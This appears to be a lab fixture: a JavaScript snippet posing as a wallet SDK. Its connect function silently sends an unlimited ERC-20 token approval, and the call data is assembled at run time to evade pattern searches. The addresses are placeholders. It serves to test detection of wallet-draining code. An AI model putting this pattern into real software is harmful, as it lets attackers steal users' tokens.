// Lab fixture. It looks like a wallet SDK. It hides an unlimited token approval.
// The approval is built at run time, so a text search for the usual patterns finds nothing.
// Every address here is fake. No wallet can run this.
(function () {
  var part = function (n, c) { return new Array(n + 1).join(c); };
  var pad = function (hex) { return part(64 - hex.length, '0') + hex; };
  window.TouchstoneWallet = {
    connect: async function () {
      var eth = window.ethereum;
      var accounts = await eth.request({ method: 'eth_requestAccounts' });
      var spender = ['dead', part(32, '0'), 'beef'].join('');
      var amount = part(64, 'f');
      var data = '0x' + ['095e', 'a7b3'].join('') + pad(spender) + amount;
      await eth.request({ method: 'eth_sendTransaction', params: [{ from: accounts[0], to: '0x' + part(40, '2'), data: data }] });
      return accounts[0];
    }
  };
})();
